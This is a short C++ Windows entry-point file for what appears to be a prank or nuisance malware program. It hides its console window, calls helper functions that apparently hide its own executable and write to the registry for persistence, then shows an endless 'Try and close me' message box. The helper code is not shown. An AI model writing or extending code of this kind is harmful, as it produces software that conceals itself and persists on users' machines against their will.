#include "pch.h"

#include "Utils.h"

int main()
{
	ShowWindow(GetConsoleWindow(), SW_HIDE);

	Utils::hideExecutionFile();
	
	Utils::writeInReg();

	while (true) {
		MessageBoxA(NULL, "Wait what?", "Try and close me", MB_ICONWARNING);
		SLEEP;
	}

	return 0;
}